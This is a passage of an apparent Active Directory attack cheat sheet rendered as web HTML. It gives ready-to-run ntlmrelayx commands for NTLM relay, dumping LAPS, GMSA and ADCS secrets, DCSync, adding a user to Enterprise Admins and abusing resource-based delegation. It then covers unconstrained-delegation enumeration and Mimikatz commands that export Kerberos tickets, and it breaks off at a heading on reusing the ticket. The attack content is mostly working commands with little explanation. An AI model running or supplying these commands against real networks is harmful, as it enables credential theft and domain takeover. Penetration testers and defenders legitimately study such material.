0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<h4 id="bkmrk-ntlmrelayx">ntlmrelayx</h4>
<p id="bkmrk-if-only-smbv2-is-sup">If only SMBv2 is supported, <code>-smb2support</code> can be used. To attempt the remove the MIC if vulnerable, <code>--remove-mic</code> can be used.</p>
<p id="bkmrk-multiple-targets-can">Multiple targets can be specified with <code>-tf list.txt</code>.</p>
<ul id="bkmrk-enumeration"><li>Enumeration</li>
</ul><div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true" style="display: block; right: 0px; left: 29px;"><div style="height: 100%; min-height: 1px; width: 557px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 55px; min-width: 557.095px; padding-right: 0px; padding-bottom: 10px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">#With attempt to dump possible GMSA and LAPS passwords, and ADCS templates</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">ntlmrelayx.py ldap://dc <span class="cm-attribute">--dump-adcs</span> <span class="cm-attribute">--dump-laps</span> <span class="cm-attribute">--dump-gmsa</span> <span class="cm-attribute">--no-da</span> <span class="cm-attribute">--no-acl</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 10px solid transparent; top: 55px;"></div><div class="CodeMirror-gutters" style="height: 105px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<ul id="bkmrk-socks"><li>SOCKS</li>
</ul><div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true"><div style="height: 100%; min-height: 1px; width: 0px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 55px; min-width: 260.333px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">ntlmrelayx.py smb://target <span class="cm-attribute">-socks</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">ntlmrelayx.py mssql://target <span class="cm-attribute">-socks</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 0px solid transparent; top: 55px;"></div><div class="CodeMirror-gutters" style="height: 95px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<ul id="bkmrk-creds-dump"><li>Creds dump</li>
</ul><div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true"><div style="height: 100%; min-height: 1px; width: 0px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 34px; min-width: 195.19px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">ntlmrelayx.py smb://target</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 0px solid transparent; top: 34px;"></div><div class="CodeMirror-gutters" style="height: 74px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<ul id="bkmrk-dcsync"><li>DCSync</li>
</ul><div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true"><div style="height: 100%; min-height: 1px; width: 0px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 34px; min-width: 187.952px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">ntlmrelayx.py dcsync://dc</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 0px solid transparent; top: 34px;"></div><div class="CodeMirror-gutters" style="height: 74px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<ul id="bkmrk-privesc"><li>Privesc</li>
</ul><p id="bkmrk-add-an-user-to-enter">Add an user to <strong>Enterprise Admins</strong>.</p>
<div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true" style="display: block; right: 0px; left: 29px;"><div style="height: 100%; min-height: 1px; width: 405px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 34px; min-width: 405.095px; padding-right: 0px; padding-bottom: 10px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">ntlmrelayx.py ldap://dc <span class="cm-attribute">--escalate-user</span> user1 <span class="cm-attribute">--no-dump</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 10px solid transparent; top: 34px;"></div><div class="CodeMirror-gutters" style="height: 84px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<ul id="bkmrk-kerberos-delegation"><li>Kerberos Delegation</li>
</ul><div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true" style="display: block; right: 0px; left: 29px;"><div style="height: 100%; min-height: 1px; width: 796px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 185px; min-width: 795.952px; padding-right: 0px; padding-bottom: 10px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style=""><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">#Create a new computer account through LDAPS and enabled RBCD</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">ntlmrelayx.py ldaps://dc_IP <span class="cm-attribute">--add-computer</span> <span class="cm-attribute">--delegate-access</span> <span class="cm-attribute">--no-dump</span> <span class="cm-attribute">--no-da</span> <span class="cm-attribute">--no-acl</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">3</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text=""></span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">4</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">#Create a new computer account through LDAP with StartTLS and enabled RBCD</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">5</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">ntlmrelayx.py ldap://dc_IP <span class="cm-attribute">--add-computer</span> <span class="cm-attribute">--delegate-access</span> <span class="cm-attribute">--no-dump</span> <span class="cm-attribute">--no-da</span> <span class="cm-attribute">--no-acl</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">6</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text=""></span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">7</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">#Doesn't create a new computer account and use an existing one</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">8</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">ntlmrelayx.py ldap://dc_IP <span class="cm-attribute">--escalate-user</span> &lt;controlled_computer&gt; <span class="cm-attribute">--delegate-access</span> <span class="cm-attribute">--no-dump</span> <span class="cm-attribute">--no-da</span> <span class="cm-attribute">--no-acl</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 10px solid transparent; top: 185px;"></div><div class="CodeMirror-gutters" style="height: 235px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<ul id="bkmrk-from-a-mitm6-authent"><li>From a mitm6 authent</li>
</ul><div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true" style="display: block; right: 0px; left: 29px;"><div style="height: 100%; min-height: 1px; width: 564px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 55px; min-width: 564.333px; padding-right: 0px; padding-bottom: 10px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">#Attempts to open a socks and write loot likes dumps into a file</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">ntlmrelayx.py <span class="cm-attribute">-tf</span> targets.txt <span class="cm-attribute">-wh</span> attacker.domain.local <span class="cm-attribute">-6</span> <span class="cm-attribute">-l</span> loot.txt <span class="cm-attribute">-socks</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 10px solid transparent; top: 55px;"></div><div class="CodeMirror-gutters" style="height: 105px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<ul id="bkmrk-adcs-esc8"><li>
<a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory-certificate-services#bkmrk-http-endpoint---esc8">ADCS ESC8</a>
</li>
</ul><h2 id="bkmrk-kerberos-delegations"><strong>Kerberos Delegations</strong></h2>
<p id="bkmrk-kerberos-delegations-0">Kerberos delegations can be used for local privesc, lateral movement or domain privesc. The main purpose of Kerberos delegations is to permit a principal to access a service on behalf of another principal.</p>
<p id="bkmrk-there-are-two-main-t">There are two main types of delegation:</p>
<ul id="bkmrk-unconstrained-delega"><li>
<strong>Unconstrained Delegation</strong>: the first hop server can request access to any service on any computer</li>
<li>
<strong>Constrained Delegation</strong>: the first hop server has a list of service it can request</li>
</ul><h3 id="bkmrk-unconstrained-delega-0">Unconstrained delegation</h3>
<h4 id="bkmrk-compromised-machine-">Compromised machine in Unconstrained Delegation</h4>
<ul id="bkmrk-enumerate-computers-"><li>Enumerate computers with Unconstrained Delegation</li>
</ul><div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true" style="display: block; right: 0px; left: 29px;"><div style="height: 100%; min-height: 1px; width: 405px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 120px; min-width: 405.095px; padding-right: 0px; padding-bottom: 10px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style=""><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Get-NetComputer</span> <span class="cm-operator">-</span><span class="cm-identifier">UnConstrained</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text=""></span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">3</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">#With AD Module</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">4</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Get-ADComputer</span> <span class="cm-operator">-</span><span class="cm-keyword">Filter</span> <span class="cm-punctuation">{</span><span class="cm-identifier">TrustedForDelegation</span> <span class="cm-operator">-eq</span> <span class="cm-builtin">$True</span><span class="cm-punctuation">}</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">5</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Get-ADUser</span> <span class="cm-operator">-</span><span class="cm-keyword">Filter</span> <span class="cm-punctuation">{</span><span class="cm-identifier">TrustedForDelegation</span> <span class="cm-operator">-eq</span> <span class="cm-builtin">$True</span><span class="cm-punctuation">}</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 10px solid transparent; top: 120px;"></div><div class="CodeMirror-gutters" style="height: 170px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<ul id="bkmrk-get-admin-ticket"><li>Get admin ticket</li>
</ul><p id="bkmrk-after-compromising-t">After compromising the computer with UD enabled, we can trick or wait for an admin connection</p>
<div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true" style="display: block; right: 0px; left: 29px;"><div style="height: 100%; min-height: 1px; width: 398px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 120px; min-width: 397.857px; padding-right: 0px; padding-bottom: 10px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style=""><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">#Check if a ticket is available</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Invoke-Mimikatz</span> <span class="cm-operator">-</span><span class="cm-identifier">Command</span> <span class="cm-string">'"sekurlsa::tickets"'</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">3</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text=""></span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">4</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">#If yes</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">5</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Invoke-Mimikatz</span> <span class="cm-operator">-</span><span class="cm-identifier">Command</span> <span class="cm-string">'"sekurlsa::tickets /export"'</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 10px solid transparent; top: 120px;"></div><div class="CodeMirror-gutters" style="height: 170px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<ul id="bkmrk-reuse-the-ticket"><li>Reuse the ticket</li>
